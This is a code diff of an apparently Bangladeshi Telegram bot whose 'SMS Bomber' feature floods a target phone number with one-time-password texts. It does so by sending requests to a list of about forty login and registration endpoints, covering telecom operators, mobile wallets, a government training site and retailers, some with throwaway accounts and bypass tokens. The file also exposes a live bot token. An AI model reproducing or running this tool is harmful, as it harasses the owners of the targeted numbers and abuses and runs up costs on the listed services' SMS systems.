@@ -12,7 +12,7 @@ from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKe
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ===================== কনফিগারেশন =====================
-BOT_TOKEN = "8892555423:AAHcUvQgf2Y8byocmHuc9zgNLE-tD52nNL4"
+BOT_TOKEN = "8892555423:AAHcUvQgf2Y8byocmHuc9zgNLE-tD52nNL4"  # আপনার নতুন টোকেন দিন (লগে যা দেখাচ্ছে)
 ADMIN_ID = 1967494059
 ADMIN_USERNAME = "RobiEntertainment"
 OWNER_USERNAME = "RobiEntertainment"
@@ -34,87 +34,46 @@ API_LIMITS = {
 
 # ===================== সমস্ত ৪৯টি API =====================
 WORKING_APIS = [
-    # 9. Deshal.net
     {"name": "Deshal.net", "method": "POST", "url": "https://app.deshal.net/api/auth/login", "body": {"phone": "{phone}"}},
-    # 10. Grameenphone Web Login
     {"name": "Grameenphone", "method": "POST", "url": "https://weblogin.grameenphone.com/backend/api/v1/otp", "body": {"msisdn": "{phone}"}},
-    # 11. Grameenphone (FWA / Bkash)
     {"name": "GP FWA", "method": "POST", "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", "body": {"phone": "{phone}", "email": "", "language": "en"}},
-    # 12. BusBD.com.bd
     {"name": "BusBD", "method": "POST", "url": "https://api.busbd.com.bd/api/auth", "body": {"phone": "+88{phone}"}},
-    # 13. Paperfly
     {"name": "Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "body": {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"}},
-    # 14. OsudPotro.com
     {"name": "OsudPotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "body": {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"}},
-    # 15. Apex4u.com
     {"name": "Apex4u", "method": "POST", "url": "https://api.apex4u.com/api/auth/login", "body": {"phoneNumber": "{phone}"}},
-    # 16. Bohubrihi.com
     {"name": "Bohubrihi", "method": "POST", "url": "https://bb-api.bohubrihi.com/public/activity/otp", "body": {"phone": "{phone}", "intent": "login"}},
-    # 17. Fundesh.com.bd
     {"name": "Fundesh", "method": "POST", "url": "https://fundesh.com.bd/api/auth/generateOTP", "body": {"msisdn": "{phone}"}},
-    # 18. Jatri / JSLGlobal
     {"name": "Jatri", "method": "POST", "url": "https://user-api.jslglobal.co/v2/send-otp", "body": {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}},
-    # 19. RedX
     {"name": "RedX", "method": "POST", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "body": {"mobile": "+88{phone}"}},
-    # 20. RabbitHoleBD
     {"name": "RabbitHoleBD", "method": "POST", "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP", "body": {"mobile": "+88{phone}"}},
-    # 21. Qcoom.com
     {"name": "Qcoom", "method": "POST", "url": "https://auth.qcoom.com/api/v1/otp/send", "body": {"mobileNumber": "+88{phone}"}},
-    # 22. Garibookadmin.com
     {"name": "Garibook", "method": "POST", "url": "https://api.garibookadmin.com/api/v4/user/login", "body": {"mobile": "+880{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web"}},
-    # 23. Training.gov.bd
     {"name": "Training.gov.bd", "method": "POST", "url": "https://training.gov.bd/backoffice/api/user/sendOtp", "body": {"mobile": "{phone}"}},
-    # 24. Shikho.com (Intent-1)
     {"name": "Shikho-1", "method": "POST", "url": "https://api.shikho.com/public/activity/otp", "body": {"phone": "{phone}", "intent": "ap-discount-request"}},
-    # 25. Easy.com.bd
     {"name": "Easy.com.bd", "method": "POST", "url": "https://core.easy.com.bd/api/v1/registration", "body": {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be"}},
-    # 26. Robi (DA API)
     {"name": "Robi DA", "method": "POST", "url": "https://da-api.robi.com.bd/da-nll/otp/send", "body": {"msisdn": "{phone}"}},
-    # 27. Hoichoi (Viewlift)
     {"name": "Hoichoi", "method": "POST", "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "body": {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": True, "whatsappConsent": True}},
-    # 28. Addatimes.com
     {"name": "Addatimes", "method": "POST", "url": "https://app.addatimes.com/api/login", "body": {"phone": "{phone}", "country_code": "BD"}},
-    # 29. Regal Furniture
     {"name": "Regal Furniture", "method": "POST", "url": "https://regalfurniturebd.com/api/auth/otp-generate", "body": {"phone": "{phone}", "verification_code": ""}},
-    # 30. DeeptoPlay.com
     {"name": "DeeptoPlay", "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"}},
-    # 31. TimezoneBD
     {"name": "TimezoneBD", "method": "POST", "url": "https://backend.timezonebd.com/api/v1/user/otp-request", "body": {"phone": "{phone}"}},
-    # 32. UpaySystem
     {"name": "UpaySystem", "method": "POST", "url": "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", "body": {"device_uuid": "test_device", "firebase_token": "test_token", "geo_location": "23.7,90.3", "mno": "Grameenphone", "wallet_number": "{phone}"}},
-    # 33. Chorki.com
     {"name": "Chorki", "method": "POST", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"number": "+880{phone}"}},
-    # 34. Arogga.com
     {"name": "Arogga", "method": "POST", "url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", "body": {"mobile": "{phone}", "fcmToken": "", "referral": ""}},
-    # 35. Pkluck2
     {"name": "Pkluck2", "method": "POST", "url": "https://www.pkluck2.com/wps/verification/sms/noLogin", "body": {"mobileNum": "{phone}", "countryDialingCode": "880"}},
-    # 36. AppLink
     {"name": "AppLink", "method": "POST", "url": "https://applink.com.bd/appstore-v4-server/login/otp/request", "body": {"msisdn": "880{phone}"}},
-    # 37. Care-Box
     {"name": "Care-Box", "method": "POST", "url": "https://newprod.api-care-box.click:444/api/user/register/?version=otp", "body": {"Name": "Abdullah Al Mamun", "Phone": "+880{phone}"}},
-    # 38. Ghoori Learning
     {"name": "Ghoori Learning", "method": "POST", "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "body": {"mobile_no": "{phone}"}},
-    # 39. Jayabaji BD
     {"name": "Jayabaji BD", "method": "POST", "url": "https://www.jayabajibd.life/api/register/confirm", "body": {"mobileno": "{phone}", "username": "abffjddngf864", "firstname": "", "new_password": "tPNVOcen!6XEz3b", "confirm_new_password": "tPNVOcen!6XEz3b", "country_code": "880", "country": "BD", "currency": "BDT", "ref": "", "language": "en"}},
-    # 40. Swap.com.bd
     {"name": "Swap.com.bd", "method": "POST", "url": "https://api.swap.com.bd/api/v1/send-otp/v2", "body": {"phone": "{phone}"}},
-    # 41. BdTickets.com
     {"name": "BdTickets", "method": "POST", "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send", "body": {"phone": "+880{phone}"}},
-    # 42. Binge.buzz (POST)
     {"name": "Binge.buzz", "method": "POST", "url": "https://ss.binge.buzz/otp/send/login", "body": {"mobile": "{phone}"}},
-    # 43. SendMySMS
     {"name": "SendMySMS", "method": "POST", "url": "https://sendmysms.net/send-otp.php", "body": {"phonenumber": "{phone}"}},
-    # 44. Shikho.com (Intent-2)
     {"name": "Shikho-2", "method": "POST", "url": "https://api.shikho.com/auth/v2/send/sms", "body": {"auth_type": "login", "phone": "{phone}", "vendor": "shikho", "type": "student"}},
-    # 45. Eonbazar
     {"name": "Eonbazar", "method": "POST", "url": "https://app.eonbazar.com/api/auth/login", "body": {"method": "otp", "mobile": "{phone}"}},
-    # 46. NESCO SSL Wireless
     {"name": "NESCO", "method": "POST", "url": "http://nesco.sslwireless.com/api/v1/login", "body": {"phone_number": "{phone}"}},
-    # 47. Quizgiri
     {"name": "Quizgiri", "method": "POST", "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp", "body": {"country_code": "+880", "phone": "{phone}"}},
-    # 48. Bazar365
     {"name": "Bazar365", "method": "POST", "url": "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", "body": {"phone": "{phone}", "applicationChannel": "WEB_APP"}},
-    # 49. Bioscopelive (Alternative)
     {"name": "Bioscopelive", "method": "POST", "url": "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", "body": {"phone": "{phone}", "applicationChannel": "WEB_APP"}},
 ]
 
@@ -234,7 +193,6 @@ async def track_api_usage(api_name, user_id, success):
     except Exception as e:
         logger.error(f"Track API error: {e}")
 
-# ===================== অ্যাডমিন লগ =====================
 async def admin_log(admin_id, action, target_id=None, details=""):
     try:
         async with aiosqlite.connect(DB_PATH) as db:
@@ -302,6 +260,7 @@ async def get_total_sms(user_id):
             row = await cur.fetchone()
             return row[0] if row else 0
 
+# ===================== SEND SMS =====================
 async def cmd_sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     async with aiosqlite.connect(DB_PATH) as db:
@@ -381,6 +340,7 @@ async def sms_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     context.user_data.clear()
 
+# ===================== SMS BOMBER =====================
 async def cmd_bomber(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "💣 **SMS Bomber**\n\nEnter target number:\nExample: `018XXXXXXXX`\n📡 APIs: {len(WORKING_APIS)}\n⚠️ Max 20 per API",
@@ -499,6 +459,7 @@ async def bomber_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text(result_message, parse_mode="Markdown", reply_markup=get_main_keyboard())
     context.user_data.clear()
 
+# ===================== প্রোফাইল, স্ট্যাটস, রিডিম, কন্টাক্ট =====================
 async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     async with aiosqlite.connect(DB_PATH) as db:
